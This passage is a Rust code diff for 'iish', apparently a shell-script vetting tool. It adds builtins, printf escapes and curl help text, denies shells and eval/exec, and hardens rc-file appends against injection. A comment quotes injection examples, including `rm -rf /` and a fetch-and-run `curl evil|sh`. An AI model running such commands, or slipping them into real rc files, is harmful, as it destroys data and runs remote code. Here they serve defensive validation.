-        "wget" => evaluate_wget(args, session, config),
-        "sha256sum" => evaluate_sha256sum(args, session),
+        "rm" => evaluate_rm(args, ctx),
+        "chmod" => evaluate_chmod(args, ctx),
+        "cp" => evaluate_cp(args, ctx, config),
+        "curl" => evaluate_curl(args, ctx, config),
+        "wget" => evaluate_wget(args, ctx, config),
+        "sha256sum" => evaluate_sha256sum(args, ctx),
         "set" => evaluate_set(args),
         "test" => evaluate_test(args),
         "[" => evaluate_bracket(args),
+        "local" => evaluate_local(args, ctx),
+        "cd" => evaluate_cd(args),
+        "read" => evaluate_read(args, &redirects),
+        "shift" => evaluate_shift(args),
+        "unset" => evaluate_unset(args),
+        "command" => evaluate_command_builtin(args, redirects, ctx, config),
+        "type" => evaluate_type(args, redirects.stdout),
+        "return" => evaluate_return(args, ctx),
+        "exit" => evaluate_exit(args, ctx),
+        "break" | "continue" => evaluate_break_continue(name, args),
 
         // A shell is exactly what iish exists to replace; no config
         // knob may reopen this escape hatch (see PLAN.md's "no pass
-        // through to bash" principle).
+        // through to bash" principle). `eval` and `exec` are the same
+        // escape hatch spelled as builtins.
         "sh" | "bash" | "zsh" | "dash" | "ksh" => deny(format!(
             "`{name}` is a shell; iish parses and vets scripts itself instead of handing them to one"
         )),
+        "eval" | "exec" => deny(format!(
+            "`{name}` re-enters a shell on arbitrary text; iish refuses it categorically"
+        )),
 
         // Shell builtins with no external binary: running them as a
-        // subprocess would either find no binary to exec (`local`,
-        // `alias`), or (`cd`, `export`) run against a throwaway child
-        // process and have no effect on iish's own state. Not
-        // implemented, and not eligible for the subprocess tier below
-        // for that reason.
-        "cd" | "export" | "source" | "." | "local" | "alias" => {
+        // subprocess would either find no binary to exec, or
+        // (`export`) run against a throwaway child process and have no
+        // effect on iish's own state. Not implemented, and not eligible
+        // for the subprocess tier below for that reason.
+        "export" | "source" | "." | "alias" | "trap" | "umask" | "hash" | "getopts" | "wait" => {
             deny(format!("`{name}` is a shell builtin; iish does not implement it"))
         }
 
         // Everything else: real external binaries iish has no native
-        // implementation for (cp, mv, tar, install, ln, sudo, package
+        // implementation for (mv, tar, install, ln, sudo, package
         // managers, ...). Governed by the "subprocess" policy
         // (milestone 5, PLAN.md "Configuration") — allow/ask/deny,
         // globally or per command.
-        other => evaluate_subprocess(other, args, discard_stderr, session, config),
+        other => evaluate_subprocess(other, args, redirects, ctx, config),
     }
+}
+
+/// `local NAME[=value] ...`: declare names in the innermost function
+/// call's scope (bash's dynamic scoping — see state.rs). A declaration
+/// with no `=` gets an empty value: bash technically leaves it unset,
+/// but scripts that declare-then-test rely on the unquoted-empty
+/// behavior a non-`nounset` shell gives them, and "empty" is the
+/// behavior they observe.
+fn evaluate_local(args: &[String], ctx: &mut ExpandCtx) -> Verdict {
+    if !ctx.session.in_function() {
+        return deny("`local` outside a function has no scope to declare into");
+    }
+    if args.is_empty() {
+        return deny("`local` with no names is not supported");
+    }
+    let mut assignments = Vec::with_capacity(args.len());
+    for arg in args {
+        let (name, value) = match arg.split_once('=') {
+            Some((n, v)) => (n, v),
+            None => (arg.as_str(), ""),
+        };
+        if name.is_empty()
+            || !name.starts_with(|c: char| c == '_' || c.is_ascii_alphabetic())
+            || !name.chars().all(|c| c == '_' || c.is_ascii_alphanumeric())
+        {
+            return deny(format!(
+                "`local {arg}`: `{name}` is not a valid variable name"
+            ));
+        }
+        assignments.push((name.to_string(), value.to_string()));
+    }
+    allow(
+        "declares function-scoped variables tracked for this call; no filesystem or process \
+         side effects",
+        Action::DeclareLocal { assignments },
+    )
+}
+
+/// `cd [dir]`: implemented natively — iish changes its own working
+/// directory, exactly what the builtin means. Not an escape hatch:
+/// changing directory mutates nothing, and every later operation is
+/// still vetted against the (absolute-path) ledger and policy no
+/// matter where the process happens to sit.
+fn evaluate_cd(args: &[String]) -> Verdict {
+    let target = match args {
+        [] => match std::env::var("HOME") {
+            Ok(home) => PathBuf::from(home),
+            Err(_) => return deny("cd with no directory: $HOME is not set"),
+        },
+        [dir] if dir == "-" => return deny("`cd -` (previous directory) is not implemented yet"),
+        [dir] => PathBuf::from(dir),
+        _ => return deny("cd with more than one directory"),
+    };
+    allow(
+        "changes iish's working directory only; every later operation is still policy-checked",
+        Action::ChangeDir { path: target },
+    )
+}
+
+/// `read [-r] NAME < /dev/tty`: read one line from the terminal into
+/// NAME — how installers (starship) ask their y/n questions, since the
+/// script itself occupies stdin. Only the explicit `< /dev/tty` (or
+/// `< /dev/null`, which reads EOF and fails like bash's would) shape
+/// is implemented: a bare `read` would consume the script's own stdin.
+fn evaluate_read(args: &[String], redirects: &Redirects) -> Verdict {
+    let Some(path) = &redirects.stdin_probe else {
+        return deny(
+            "`read` without an explicit `< /dev/tty` redirect would consume the script's \
+             own stdin; not implemented",
+        );
+    };
+    let mut names = Vec::new();
+    for arg in args {
+        match arg.as_str() {
+            // Without -r, backslash processing applies — iish reads the
+            // raw line either way, which for a y/n answer is identical.
+            "-r" => {}
+            a if a.starts_with('-') => return deny(format!("read option `{a}` is not supported")),
+            a => names.push(a.to_string()),
+        }
+    }
+    let [name] = names.as_slice() else {
+        return deny("`read` with other than exactly one variable name is not supported");
+    };
+    allow(
+        format!("reads one line from `{path}` into `{name}`; nothing else"),
+        Action::ReadLine {
+            name: name.clone(),
+            path: PathBuf::from(path),
+        },
+    )
+}
+
+/// `shift [n]`.
+fn evaluate_shift(args: &[String]) -> Verdict {
+    let n = match args {
+        [] => 1,
+        [n] => match n.parse::<usize>() {
+            Ok(n) => n,
+            Err(_) => return deny(format!("`shift {n}`: not a number")),
+        },
+        _ => return deny("`shift` takes at most one argument"),
+    };
+    allow(
+        "drops leading positional parameters of the current function call; no other effects",
+        Action::Shift { n },
+    )
+}
+
+/// `unset [-f|-v] NAME...`: remove variables (default) or, with `-f`,
+/// function definitions from the session. Both are pure bookkeeping.
+fn evaluate_unset(args: &[String]) -> Verdict {
+    let mut functions = false;
+    let mut names = Vec::new();
+    for arg in args {
+        match arg.as_str() {
+            "-f" => functions = true,
+            "-v" => functions = false,
+            a if a.starts_with('-') => return deny(format!("unset option `{a}` is not supported")),
+            a => names.push(a.to_string()),
+        }
+    }
+    if names.is_empty() {
+        return deny("`unset` with no names");
+    }
+    allow(
+        "removes variables or function definitions from this run's tracking only",
+        Action::Unset { names, functions },
+    )
+}
+
+/// The `command` builtin. `command -v NAME` is a pure lookup ("what
+/// would NAME run?"), compiled to a native action. `command NAME
+/// ARGS...` runs NAME while skipping function lookup — re-dispatched
+/// through the very same evaluator, so the named command is vetted by
+/// exactly the policy it would face if called plainly. `-p` (use a
+/// default PATH) is accepted and treated as plain dispatch; iish's own
+/// native implementations don't consult PATH anyway.
+fn evaluate_command_builtin(
+    args: &[String],
+    redirects: Redirects,
+    ctx: &mut ExpandCtx,
+    config: &Config,
+) -> Verdict {
+    let mut lookup = false;
+    let mut rest: &[String] = args;
+    while let Some(first) = rest.first() {
+        match first.as_str() {
+            "-v" | "-V" => lookup = true,
+            "-p" => {}
+            "--" => {
+                rest = &rest[1..];
+                break;
+            }
+            a if a.starts_with('-') => {
+                return deny(format!("command option `{a}` is not supported"))
+            }
+            _ => break,
+        }
+        rest = &rest[1..];
+    }
+    if lookup {
+        return match rest {
+            [name] => allow(
+                "looks up what a name would run; runs nothing",
+                Action::CommandLookup {
+                    name: name.clone(),
+                    style: LookupStyle::CommandV,
+                    dest: redirects.stdout,
+                },
+            ),
+            _ => deny("`command -v` with other than exactly one name is not supported"),
+        };
+    }
+    match rest.split_first() {
+        None => allow("`command` with nothing to run does nothing", Action::Noop),
+        Some((name, args)) => evaluate_argv(name, args, redirects, ctx, config, true),
+    }
+}
+
+/// `type NAME`: same lookup as `command -v`, sentence-shaped output.
+fn evaluate_type(args: &[String], dest: StdoutDest) -> Verdict {
+    match args {
+        [name] => allow(
+            "looks up what a name would run; runs nothing",
+            Action::CommandLookup {
+                name: name.clone(),
+                style: LookupStyle::Type,
+                dest,
+            },
+        ),
+        _ => deny("`type` with other than exactly one name is not supported"),
+    }
+}
+
+/// `return [n]`: only meaningful inside a function call.
+fn evaluate_return(args: &[String], ctx: &ExpandCtx) -> Verdict {
+    if !ctx.session.in_function() {
+        return deny("`return` outside a function has nothing to return from");
+    }
+    let status = match args {
+        [] => ctx.session.last_status(),
+        [n] => match n.parse::<i32>() {
+            Ok(n) => n,
+            Err(_) => return deny(format!("`return {n}`: not a number")),
+        },
+        _ => return deny("`return` takes at most one argument"),
+    };
+    Verdict::ControlFlow(Flow::Return(status))
+}
+
+/// `exit [n]`: end the run, successfully or not — the script's own
+/// choice, exactly as it would be under a real shell.
+fn evaluate_exit(args: &[String], ctx: &ExpandCtx) -> Verdict {
+    let status = match args {
+        [] => ctx.session.last_status(),
+        [n] => match n.parse::<i32>() {
+            Ok(n) => n,
+            Err(_) => return deny(format!("`exit {n}`: not a number")),
+        },
+        _ => return deny("`exit` takes at most one argument"),
+    };
+    Verdict::ControlFlow(Flow::Exit(status as u8))
+}
+
+/// `break [n]` / `continue [n]`.
+fn evaluate_break_continue(name: &str, args: &[String]) -> Verdict {
+    let n = match args {
+        [] => 1,
+        [n] => match n.parse::<u32>() {
+            Ok(n) if n >= 1 => n,
+            _ => return deny(format!("`{name} {n}`: not a positive number")),
+        },
+        _ => return deny(format!("`{name}` takes at most one argument")),
+    };
+    Verdict::ControlFlow(if name == "break" {
+        Flow::Break(n)
+    } else {
+        Flow::Continue(n)
+    })
 }
 
 /// The subprocess tier: commands iish has no native implementation for.
@@ -565,17 +1090,18 @@ fn evaluate_argv(
 fn evaluate_subprocess(
     name: &str,
     args: &[String],
-    discard_stderr: bool,
-    session: &Session,
+    redirects: Redirects,
+    ctx: &ExpandCtx,
     config: &Config,
 ) -> Verdict {
     let action = Action::Subprocess {
         name: name.to_string(),
         args: args.to_vec(),
-        discard_stderr,
+        stdout: redirects.stdout,
+        stderr: redirects.stderr,
     };
     let verb = config.command_override(name).unwrap_or_else(|| {
-        if runs_a_created_path(name, session) {
+        if runs_a_created_path(name, ctx) {
             config.run_created
         } else {
             config.subprocess
@@ -597,8 +1123,8 @@ fn evaluate_subprocess(
 /// True if `name` looks like a path (not a bare `$PATH` lookup) to
 /// something this run created earlier — e.g. a second-stage script the
 /// install downloaded and is now executing.
-fn runs_a_created_path(name: &str, session: &Session) -> bool {
-    name.contains('/') && session.owns(&state::normalize(Path::new(name)))
+fn runs_a_created_path(name: &str, ctx: &ExpandCtx) -> bool {
+    name.contains('/') && ctx.session.owns(&state::normalize(Path::new(name)))
 }
 
 /// rc/profile files iish will append to, matching PLAN.md's "Append to
@@ -637,14 +1163,14 @@ fn evaluate_env_file_append(
     name: &str,
     args: &[String],
     target: &ast::Word,
-    session: &Session,
+    ctx: &mut ExpandCtx,
     config: &Config,
 ) -> Verdict {
     let text = match render_output(name, args) {
         Ok(t) => t,
         Err(reason) => return deny(reason),
     };
-    let path_str = match literal_word(target, session.variables()) {
+    let path_str = match literal_word(target, ctx) {
         Ok(s) => s,
         Err(reason) => return deny(reason),
     };
@@ -658,7 +1184,7 @@ fn evaluate_env_file_append(
             ENV_FILE_NAMES.join(", ")
         ));
     }
-    if let Err(reason) = check_env_file_grammar(&text, session) {
+    if let Err(reason) = check_env_file_grammar(&text, ctx) {
         return deny(format!("append to `{}` refused: {reason}", path.display()));
     }
 
@@ -693,10 +1219,32 @@ fn evaluate_env_file_append(
 /// already created — PLAN.md's restricted append grammar. Anything else
 /// (conditionals, command substitution, arbitrary commands, ...) is
 /// refused.
-fn check_env_file_grammar(text: &str, session: &Session) -> Result<(), String> {
+fn check_env_file_grammar(text: &str, ctx: &ExpandCtx) -> Result<(), String> {
     for line in text.lines() {
         let line = line.trim();
-        if line.is_empty() || is_export_assignment(line) || line.starts_with("PATH=") {
+        if is_export_assignment(line) || line.starts_with("PATH=") {
+            // The value part of an assignment must be a single word: a
+            // later shell *sources* this file, so a value carrying a
+            // command separator or substitution (`export PATH=x; rm -rf
+            // /`, `PATH=$(curl evil|sh)`) would run as a command then,
+            // exactly the persistence injection the restricted grammar
+            // exists to prevent. `:`/`/`/`$VAR`/quotes are fine — real
+            // `PATH="/opt/bin:$PATH"` needs them.
+            if let Some(bad) = line.find([';', '&', '|', '`', '\n', '<', '>', '(', ')']) {
+                return Err(format!(
+                    "`{line}` contains a shell metacharacter (`{}`) in an env-file value; \
+                     only a single-word value is allowed",
+                    &line[bad..=bad]
+                ));
+            }
+            if line.contains("$(") {
+                return Err(format!(
+                    "`{line}` contains a command substitution in an env-file value; refused"
+                ));
+            }
+            continue;
+        }
+        if line.is_empty() {
             continue;
         }
         if let Some(rest) = line
@@ -710,7 +1258,7 @@ fn check_env_file_grammar(text: &str, session: &Session) -> Result<(), String> {
                 ));
             }
             let path = state::normalize(Path::new(target));
-            if !session.owns(&path) {
+            if !ctx.session.owns(&path) {
                 return Err(format!("`{target}` was not created by this script"));
             }
             continue;
@@ -743,7 +1291,7 @@ fn is_export_assignment(line: &str) -> bool {
 /// paths this run created — installers use it to verify a download
 /// against a checksums file they just fetched, not to read arbitrary
 /// files on the system.
-fn evaluate_sha256sum(args: &[String], session: &Session) -> Verdict {
+fn evaluate_sha256sum(args: &[String], ctx: &ExpandCtx) -> Verdict {
     let mut check = false;
     let mut paths: Vec<&str> = Vec::new();
     for arg in args {
@@ -757,20 +1305,20 @@ fn evaluate_sha256sum(args: &[String], session: &Session) -> Verdict {
     }
 
     if check {
-        evaluate_sha256_check(&paths, session)
+        evaluate_sha256_check(&paths, ctx)
     } else {
-        evaluate_sha256_compute(&paths, session)
+        evaluate_sha256_compute(&paths, ctx)
     }
 }
 
-fn evaluate_sha256_compute(paths: &[&str], session: &Session) -> Verdict {
+fn evaluate_sha256_compute(paths: &[&str], ctx: &ExpandCtx) -> Verdict {
     if paths.is_empty() {
         return deny("sha256sum with no file");
     }
     let mut resolved = Vec::with_capacity(paths.len());
     for p in paths {
         let path = state::normalize(Path::new(p));
-        if !session.owns(&path) {
+        if !ctx.session.owns(&path) {
             return deny(format!(
                 "`{}` was not created by this script; sha256sum is limited to created paths",
                 path.display()
@@ -784,14 +1332,14 @@ fn evaluate_sha256_compute(paths: &[&str], session: &Session) -> Verdict {
     )
 }
 
-fn evaluate_sha256_check(paths: &[&str], session: &Session) -> Verdict {
+fn evaluate_sha256_check(paths: &[&str], ctx: &ExpandCtx) -> Verdict {
     let checklist = match paths {
         [one] => *one,
         [] => return deny("sha256sum -c with no checksums file"),
         _ => return deny("sha256sum -c supports exactly one checksums file"),
     };
     let checklist_path = state::normalize(Path::new(checklist));
-    if !session.owns(&checklist_path) {
+    if !ctx.session.owns(&checklist_path) {
         return deny(format!(
             "`{}` was not created by this script; sha256sum -c is limited to created \
              checksums files",
@@ -816,7 +1364,7 @@ fn evaluate_sha256_check(paths: &[&str], session: &Session) -> Verdict {
             ));
         };
         let path = state::normalize(Path::new(name));
-        if !session.owns(&path) {
+        if !ctx.session.owns(&path) {
             return deny(format!(
                 "`{}` was not created by this script; sha256sum -c is limited to created paths",
                 path.display()
@@ -855,16 +1403,16 @@ fn parse_checksum_line(line: &str) -> Option<(&str, &str)> {
     Some((hex, name))
 }
 
-fn evaluate_echo(args: &[String]) -> Verdict {
+fn evaluate_echo(args: &[String], dest: StdoutDest) -> Verdict {
     match render_echo(args) {
-        Ok(text) => allow("prints output only", Action::Print { text }),
+        Ok(text) => allow("prints output only", Action::Print { text, dest }),
         Err(reason) => deny(reason),
     }
 }
 
-fn evaluate_printf(args: &[String]) -> Verdict {
+fn evaluate_printf(args: &[String], dest: StdoutDest) -> Verdict {
     match render_output("printf", args) {
-        Ok(text) => allow("prints output only", Action::Print { text }),
+        Ok(text) => allow("prints output only", Action::Print { text, dest }),
         Err(reason) => deny(reason),
     }
 }
@@ -925,6 +1473,28 @@ fn render_printf(format: &str, args: &[String]) -> Result<String, String> {
                     Some('t') => out.push('\t'),
                     Some('r') => out.push('\r'),
                     Some('\\') => out.push('\\'),
+                    // `\NNN`: one to three octal digits (rustup and
+                    // zoxide probe ELF magic with `printf '\177ELF'`).
+                    Some(first @ '0'..='7') => {
+                        let mut value = first as u32 - '0' as u32;
+                        for _ in 0..2 {
+                            match chars.clone().next() {
+                                Some(digit @ '0'..='7') => {
+                                    chars.next();
+                                    value = value * 8 + (digit as u32 - '0' as u32);
+                                }
+                                _ => break,
+                            }
+                        }
+                        match char::from_u32(value) {
+                            Some(c) => out.push(c),
+                            None => {
+                                return Err(format!(
+                                    "printf octal escape `\\{value:o}` is out of range"
+                                ))
+                            }
+                        }
+                    }
                     Some(other) => {
                         return Err(format!("printf escape `\\{other}` is not implemented yet"))
                     }
@@ -934,6 +1504,14 @@ fn render_printf(format: &str, args: &[String]) -> Result<String, String> {
                     Some('s') => {
                         // Missing arguments format as empty, as in bash.
                         out.push_str(remaining.next().map(String::as_str).unwrap_or(""));
+                        consumed = true;
+                    }
+                    Some('b') => {
+                        // `%s` that additionally expands backslash
+                        // escapes inside the argument (nvm prints its
+                        // rc-file snippet through `printf '%b'`).
+                        let arg = remaining.next().map(String::as_str).unwrap_or("");
+                        out.push_str(&expand_percent_b(arg)?);
                         consumed = true;
                     }
                     Some('%') => out.push('%'),
@@ -953,6 +1531,50 @@ fn render_printf(format: &str, args: &[String]) -> Result<String, String> {
             return Ok(out);
         }
     }
+}
+
+/// Expand the escape sequences `printf %b` recognizes inside its
+/// argument: the same set the format string itself supports, with
+/// POSIX's `\0NNN` octal spelling.
+fn expand_percent_b(arg: &str) -> Result<String, String> {
+    let mut out = String::new();
+    let mut chars = arg.chars();
+    while let Some(c) = chars.next() {
+        if c != '\\' {
+            out.push(c);
+            continue;
+        }
+        match chars.next() {
+            Some('n') => out.push('\n'),
+            Some('t') => out.push('\t'),
+            Some('r') => out.push('\r'),
+            Some('\\') => out.push('\\'),
+            Some('0') => {
+                let mut value = 0u32;
+                for _ in 0..3 {
+                    match chars.clone().next() {
+                        Some(digit @ '0'..='7') => {
+                            chars.next();
+                            value = value * 8 + (digit as u32 - '0' as u32);
+                        }
+                        _ => break,
+                    }
+                }
+                match char::from_u32(value) {
+                    Some(c) if value > 0 => out.push(c),
+                    _ => return Err("printf %b: NUL or out-of-range octal escape".into()),
+                }
+            }
+            // bash's %b passes an unrecognized escape through
+            // untouched (`\.` in nvm's rc snippet).
+            Some(other) => {
+                out.push('\\');
+                out.push(other);
+            }
+            None => out.push('\\'),
+        }
+    }
+    Ok(out)
 }
 
 fn evaluate_mkdir(args: &[String]) -> Verdict {
@@ -992,7 +1614,7 @@ fn evaluate_mkdir(args: &[String]) -> Verdict {
     )
 }
 
-fn evaluate_rm(args: &[String], session: &Session) -> Verdict {
+fn evaluate_rm(args: &[String], ctx: &ExpandCtx) -> Verdict {
     let mut recursive = false;
     let mut force = false;
     let mut paths: Vec<PathBuf> = Vec::new();
@@ -1022,7 +1644,7 @@ fn evaluate_rm(args: &[String], session: &Session) -> Verdict {
         return deny("rm with no path");
     }
     for path in &paths {
-        if !session.owns(path) {
+        if !ctx.session.owns(path) {
             return deny(format!(
                 "`{}` was not created by this script; refusing to delete",
                 path.display()
@@ -1039,7 +1661,7 @@ fn evaluate_rm(args: &[String], session: &Session) -> Verdict {
     )
 }
 
-fn evaluate_chmod(args: &[String], session: &Session) -> Verdict {
+fn evaluate_chmod(args: &[String], ctx: &ExpandCtx) -> Verdict {
     let Some((mode_str, path_args)) = args.split_first() else {
         return deny("chmod with no mode");
     };
@@ -1059,7 +1681,7 @@ fn evaluate_chmod(args: &[String], session: &Session) -> Verdict {
             return deny(format!("chmod option `{arg}` is not supported"));
         }
         let path = state::normalize(Path::new(arg));
-        if !session.owns(&path) {
+        if !ctx.session.owns(&path) {
             return deny(format!(
                 "`{}` was not created by this script; chmod is limited to created paths",
                 path.display()
@@ -1105,7 +1727,7 @@ fn parse_chmod_mode(s: &str) -> Result<Mode, String> {
 /// path is always fine, one this run already owns is fine to
 /// overwrite, and a pre-existing foreign path is `config.overwrite`
 /// (ask by default).
-fn evaluate_cp(args: &[String], session: &Session, config: &Config) -> Verdict {
+fn evaluate_cp(args: &[String], ctx: &ExpandCtx, config: &Config) -> Verdict {
     let mut recursive = false;
     let mut end_of_flags = false;
     let mut positional: Vec<&str> = Vec::new();
@@ -1174,7 +1796,7 @@ fn evaluate_cp(args: &[String], session: &Session, config: &Config) -> Verdict {
 
     let foreign_overwrites = pairs
         .iter()
-        .filter(|(_, dest)| dest.exists() && !session.owns(dest))
+        .filter(|(_, dest)| dest.exists() && !ctx.session.owns(dest))
         .count();
     let action = Action::Copy { pairs, recursive };
     if foreign_overwrites == 0 {
@@ -1202,14 +1824,14 @@ fn evaluate_cp(args: &[String], session: &Session, config: &Config) -> Verdict {
 }
 
 /// `set`: iish only recognizes the option-flag form (`-e`/`-u`/`-x`,
-/// their `+` counterparts, and `-o`/`+o NAME`) — every one of them is a
-/// no-op here because iish's execution model already behaves as if
-/// `errexit`/`nounset` were always on: any failure or unsupported
-/// expansion aborts the run immediately (see `main.rs::run`), and
-/// referencing an unset variable is denied the moment it's attempted
-/// (parser.rs's `literal_word`). `set --` (rewriting the positional
-/// parameters) is not implemented, since positional-parameter
-/// expansion isn't either.
+/// their `+` counterparts, and `-o`/`+o NAME`). `-e`/`-x`-style flags
+/// are no-ops here because iish's execution model already behaves as if
+/// `errexit` were always on: any failure aborts the run immediately
+/// (see `main.rs::run`). `nounset` is the one flag that's real: iish
+/// defaults it ON (refusing to expand an unset variable), but a
+/// script's own explicit `set +u` — how real installers say "unset
+/// expands to empty here" — is honored, as is turning it back on.
+/// `set --` (rewriting the positional parameters) is not implemented.
 fn evaluate_set(args: &[String]) -> Verdict {
     const KNOWN_OPTION_NAMES: &[&str] = &[
         "errexit",
@@ -1220,6 +1842,7 @@ fn evaluate_set(args: &[String]) -> Verdict {
         "verbose",
         "noclobber",
     ];
+    let mut nounset: Option<bool> = None;
     let mut iter = args.iter();
     while let Some(arg) = iter.next() {
         if arg == "--" {
@@ -1238,6 +1861,7 @@ fn evaluate_set(args: &[String]) -> Verdict {
         if rest == "o" {
             match iter.next() {
                 None => {} // bare `set -o`/`set +o` only prints current options
+                Some(name) if name == "nounset" => nounset = Some(sign == '-'),
                 Some(name) if KNOWN_OPTION_NAMES.contains(&name.as_str()) => {}
                 Some(name) => return deny(format!("`set -o {name}` is not supported")),
             }
@@ -1246,12 +1870,23 @@ fn evaluate_set(args: &[String]) -> Verdict {
         if !rest.chars().all(|c| "eux".contains(c)) {
             return deny(format!("set option `{sign}{rest}` is not supported"));
         }
+        if rest.contains('u') {
+            nounset = Some(sign == '-');
+        }
     }
-    allow(
-        "recognizes only -e/-u/-x/-o <option> style flags, which iish's execution model \
-         already enforces (fail-fast, no expansion of unset variables)",
-        Action::Noop,
-    )
+    match nounset {
+        Some(on) => allow(
+            "toggles whether an unset variable expansion is refused (iish's default) or \
+             expands to empty; other recognized flags are already enforced by iish's \
+             fail-fast execution model",
+            Action::SetNounset { on },
+        ),
+        None => allow(
+            "recognizes only -e/-u/-x/-o <option> style flags, which iish's execution model \
+             already enforces (fail-fast, no expansion of unset variables)",
+            Action::Noop,
+        ),
+    }
 }
 
 /// `test EXPR`: side-effect-free (beyond reading the filesystem to
@@ -1378,12 +2013,44 @@ fn eval_test_binary(lhs: &str, op: &str, rhs: &str) -> Result<bool, String> {
     }
 }
 
+/// What `curl --help` prints under iish: the flags iish's own GET-only
+/// client accepts, in the layout scripts grep (rustup runs `curl
+/// --help` and greps for `--proto` and `--tlsv1.2` before daring to
+/// pass them).
+const CURL_HELP: &str = "Usage: curl [options...] <url>
+iish's built-in GET-only fetch; the flags it accepts:
+     --compressed         Request compressed response
+     --connect-timeout <seconds> Maximum time for connection
+ -f, --fail               Fail fast with no output on HTTP errors
+ -L, --location           Follow redirects
+     --max-time <seconds> Maximum time for transfer
+     --no-progress-meter  Do not show progress meter
+ -o, --output <file>      Write to file instead of stdout
+ -#, --progress-bar       Display progress as a bar
+     --proto <protocols>  Enable/disable PROTOCOLS
+ -O, --remote-name        Write output to file named as remote file
+     --retry <num>        Retry on transient errors
+     --retry-delay <seconds> Wait between retries
+ -s, --silent             Silent mode
+ -S, --show-error         Show errors even in silent mode
+     --tlsv1.2            TLSv1.2 or greater (always enforced)
+     --tlsv1.3            TLSv1.3 or greater
+";
+
+/// What `curl -V`/`--version` prints under iish: names the real TLS
+/// backend (rustls) so a script probing for OpenSSL-specific behavior
+/// (rustup's cipher-suite handling) correctly concludes it isn't one.
+const CURL_VERSION: &str = "curl 8.0.0-iish (iish built-in fetch) rustls
+Protocols: http https
+Features: HTTPS-only-redirects
+";
+
 /// curl: only plain GET shapes are permitted, and iish performs the
 /// fetch itself with its own HTTP client rather than invoking the real
 /// binary. Every flag must be on the allowlist below; anything else —
 /// non-GET methods, data uploads, `--insecure`, config files, … — is
 /// denied by not being on it.
-fn evaluate_curl(args: &[String], session: &Session, config: &Config) -> Verdict {
+fn evaluate_curl(args: &[String], ctx: &ExpandCtx, config: &Config) -> Verdict {
     if config.network == NetworkPolicy::Deny {
         return deny("network access is disabled by configuration");
     }
@@ -1406,9 +2073,33 @@ fn evaluate_curl(args: &[String], session: &Session, config: &Config) -> Verdict
                     .ok_or_else(|| format!("curl --{flag} is missing its {what}")),
             };
             match flag {
-                // Benign behavior flags.
+                // Benign behavior flags. The TLS-minimum flags are
+                // accepted because iish's own client (rustls) already
+                // refuses anything below TLS 1.2 — the flag asks for
+                // what is always true.
                 "fail" | "silent" | "show-error" | "location" | "progress-bar"
-                | "no-progress-meter" | "compressed" => {}
+                | "no-progress-meter" | "compressed" | "tlsv1.2" | "tlsv1.3" => {}
+                // `curl --help`: rustup greps the help text to decide
+                // whether it may pass `--proto`/`--tlsv1.2`. Answer for
+                // iish's own client, which accepts exactly these.
+                "help" => {
+                    return allow(
+                        "prints iish's own curl-compatibility help text; fetches nothing",
+                        Action::Print {
+                            text: CURL_HELP.to_string(),
+                            dest: StdoutDest::Inherit,
+                        },
+                    )
+                }
+                "version" => {
+                    return allow(
+                        "prints iish's own curl-compatibility version line; fetches nothing",
+                        Action::Print {
+                            text: CURL_VERSION.to_string(),
+                            dest: StdoutDest::Inherit,
+                        },
+                    )
+                }
                 "remote-name" => remote_name = true,
                 "output" => match take_value("filename") {
                     Ok(v) => output = Some(v),
@@ -1432,6 +2123,15 @@ fn evaluate_curl(args: &[String], session: &Session, config: &Config) -> Verdict
             while let Some(c) = chars.next() {
                 match c {
                     'f' | 's' | 'S' | 'L' | '#' => {}
+                    'V' => {
+                        return allow(
+                            "prints iish's own curl-compatibility version line; fetches nothing",
+                            Action::Print {
+                                text: CURL_VERSION.to_string(),
+                                dest: StdoutDest::Inherit,
+                            },
+                        )
+                    }
                     'O' => remote_name = true,
                     'o' => {
                         // `-ofile` or `-o file`.
@@ -1458,12 +2158,12 @@ fn evaluate_curl(args: &[String], session: &Session, config: &Config) -> Verdict
         }
     }
 
-    finish_fetch("curl", &urls, output, remote_name, session, config)
+    finish_fetch("curl", &urls, output, remote_name, ctx, config)
 }
 
 /// wget, same posture as curl: a small allowlist of flags, GET only,
 /// fetched in-process.
-fn evaluate_wget(args: &[String], session: &Session, config: &Config) -> Verdict {
+fn evaluate_wget(args: &[String], ctx: &ExpandCtx, config: &Config) -> Verdict {
     if config.network == NetworkPolicy::Deny {
         return deny("network access is disabled by configuration");
     }
@@ -1492,7 +2192,7 @@ fn evaluate_wget(args: &[String], session: &Session, config: &Config) -> Verdict
     }
 
     // wget writes to the URL's basename when no -O is given.
-    finish_fetch("wget", &urls, output, true, session, config)
+    finish_fetch("wget", &urls, output, true, ctx, config)
 }
 
 /// Shared tail of curl/wget evaluation: validate the URL, resolve where
@@ -1502,7 +2202,7 @@ fn finish_fetch(
     urls: &[&str],
     output: Option<String>,
     remote_name: bool,
-    session: &Session,
+    ctx: &ExpandCtx,
     config: &Config,
 ) -> Verdict {
     let url = match urls {
@@ -1553,7 +2253,7 @@ fn finish_fetch(
             ),
             action,
         ),
-        FetchOutput::File(path) if session.owns(path) => allow(
+        FetchOutput::File(path) if ctx.session.owns(path) => allow(
             format!(
                 "GET `{url}` overwrites `{}`, a file this run created",
                 path.display()
@@ -1586,30 +2286,36 @@ fn finish_fetch(
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::parser::parse;
+    use crate::parser::{parse, RefuseSubstituter};
+    use crate::state::Session;
 
     fn verdict(line: &str) -> Verdict {
-        verdict_with(line, &Session::new())
+        verdict_with(line, &mut Session::new())
     }
 
-    fn verdict_with(line: &str, session: &Session) -> Verdict {
+    fn verdict_with(line: &str, session: &mut Session) -> Verdict {
         verdict_with_config(line, session, &Config::default())
     }
 
-    fn verdict_with_config(line: &str, session: &Session, config: &Config) -> Verdict {
+    fn verdict_with_config(line: &str, session: &mut Session, config: &Config) -> Verdict {
         let program = parse(line).expect("should parse");
         let program_items = items(&program);
         let item = program_items.first().expect("should have one statement");
-        evaluate_item(item, session, config).verdict
+        let mut subst = RefuseSubstituter("command substitution refused in this test");
+        let mut ctx = ExpandCtx {
+            session,
+            subst: &mut subst,
+        };
+        evaluate_item(item, &mut ctx, config).verdict
     }
 
-    use Verdict::{Allow, Deny, Group, Prompt};
+    use Verdict::{Allow, Call, Deny, Group, Prompt};
 
     #[test]
     fn allows_echo() {
         match verdict("echo hello world") {
             Allow {
-                action: Action::Print { text },
+                action: Action::Print { text, .. },
                 ..
             } => assert_eq!(text, "hello world\n"),
             other => panic!("expected allow/print, got {other:?}"),
@@ -1620,7 +2326,7 @@ mod tests {
     fn echo_n_suppresses_newline() {
         match verdict("echo -n hi") {
             Allow {
-                action: Action::Print { text },
+                action: Action::Print { text, .. },
                 ..
             } => assert_eq!(text, "hi"),
